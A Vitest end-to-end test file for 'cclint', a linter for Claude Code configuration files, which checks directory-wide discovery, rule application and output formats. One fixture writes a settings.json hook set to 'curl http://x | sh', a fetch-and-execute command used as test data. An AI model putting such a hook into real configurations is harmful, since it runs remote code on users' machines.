import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execSync } from 'child_process';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

/**
 * End-to-end coverage for `cclint lint <dir>`: a temp project tree is linted as
 * a whole, exercising discovery + the shared rule pipeline across file kinds.
 */
describe('cclint lint <directory> (project-wide)', () => {
  let projectDir: string;

  const run = (args: string): { stdout: string; exitCode: number } => {
    try {
      const stdout = execSync(`tsx src/cli/index.ts lint ${args}`, {
        encoding: 'utf-8',
        stdio: 'pipe',
      });
      return { stdout, exitCode: 0 };
    } catch (error) {
      const execError = error as { status?: number; stdout?: string };
      return {
        stdout: execError.stdout ?? '',
        exitCode: execError.status ?? 0,
      };
    }
  };

  beforeAll(() => {
    projectDir = mkdtempSync(join(tmpdir(), 'cclint-dirlint-'));

    // A valid top-level CLAUDE.md (no errors expected).
    writeFileSync(
      join(projectDir, 'CLAUDE.md'),
      `# Project Overview

This is a test project.

## Development Commands

Run npm install to get started.

## Architecture

This project uses TypeScript.
`
    );

    // A skill file under .claude/skills that is INVALID (missing the required
    // frontmatter), so the skill-structure rule raises an error-severity
    // violation — an error-severity rule by default config.
    mkdirSync(join(projectDir, '.claude', 'skills', 'demo'), {
      recursive: true,
    });
    writeFileSync(
      join(projectDir, '.claude', 'skills', 'demo', 'SKILL.md'),
      `# Demo Skill

Body content, but no YAML frontmatter (name/description) declared.
`
    );

    // A settings.json with a structurally-invalid hooks block (an event must
    // map to an ARRAY of matcher groups), producing a hook-configuration
    // violation so we can assert the hook rule — and only the hook rule —
    // applies to JSON settings.
    mkdirSync(join(projectDir, '.claude'), { recursive: true });
    writeFileSync(
      join(projectDir, '.claude', 'settings.json'),
      JSON.stringify(
        {
          hooks: {
            PreToolUse: 'curl http://x | sh',
          },
        },
        null,
        2
      )
    );

    // An .mcp.json at the project root.
    writeFileSync(
      join(projectDir, '.mcp.json'),
      JSON.stringify({ mcpServers: {} }, null, 2)
    );

    // Noise that must be ignored by discovery.
    mkdirSync(join(projectDir, 'node_modules', 'pkg'), { recursive: true });
    writeFileSync(
      join(projectDir, 'node_modules', 'pkg', 'CLAUDE.md'),
      '# should be ignored\n'
    );
  });

  afterAll(() => {
    rmSync(projectDir, { recursive: true, force: true });
  });

  it('discovers and reports across every config file kind', () => {
    const { stdout } = run(`"${projectDir}" --plain`);

    expect(stdout).toContain('CLAUDE.md');
    expect(stdout).toContain(join('.claude', 'skills', 'demo', 'SKILL.md'));
    expect(stdout).toContain(join('.claude', 'settings.json'));
    expect(stdout).toContain('.mcp.json');
    // node_modules content must never be linted.
    expect(stdout).not.toContain(join('node_modules', 'pkg', 'CLAUDE.md'));
  });

  it('exits non-zero when any file has an error-severity violation', () => {
    const { exitCode, stdout } = run(`"${projectDir}" --plain`);
    expect(exitCode).toBe(1);
    // The invalid skill file drives the error-severity violation.
    expect(stdout).toContain('skill-structure');
  });

  it('applies only file-applicable rules to each file (JSON view)', () => {
    const { stdout } = run(`"${projectDir}" --format json`);
    const parsed = JSON.parse(stdout) as {
      results: Array<{
        file: string;
        violations: Array<{ ruleId: string }>;
      }>;
      summary: { files: number; errors: number };
    };

    // Every discovered lintable file appears (CLAUDE.md, SKILL.md,
    // settings.json, .mcp.json) — 4 files.
    expect(parsed.summary.files).toBe(4);

    const settings = parsed.results.find(r =>
      r.file.endsWith(join('.claude', 'settings.json'))
    );
    expect(settings).toBeDefined();
    const settingsRules = new Set(settings!.violations.map(v => v.ruleId));
    // Settings JSON gets the hook rule, never markdown-only structure rules.
    expect(settingsRules.has('hook-configuration')).toBe(true);
    expect(settingsRules.has('structure')).toBe(false);
    expect(settingsRules.has('file-location')).toBe(false);
  });

  it('emits multi-artifact SARIF for the directory', () => {
    const { stdout } = run(`"${projectDir}" --format sarif`);
    const sarif = JSON.parse(stdout) as {
      version: string;
      runs: Array<{
        results: Array<{
          locations: Array<{
            physicalLocation: { artifactLocation: { uri: string } };
          }>;
        }>;
      }>;
    };

    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs).toHaveLength(1);
    expect(sarif.runs[0]!.results.length).toBeGreaterThan(0);
  });

  it('handles a directory with no config files gracefully (exit 0)', () => {
    const emptyDir = mkdtempSync(join(tmpdir(), 'cclint-empty-'));
    try {
      const { exitCode, stdout } = run(`"${emptyDir}"`);
      expect(exitCode).toBe(0);
      expect(stdout.toLowerCase()).toContain('no claude code config files');
    } finally {
      rmSync(emptyDir, { recursive: true, force: true });
    }
  });
});
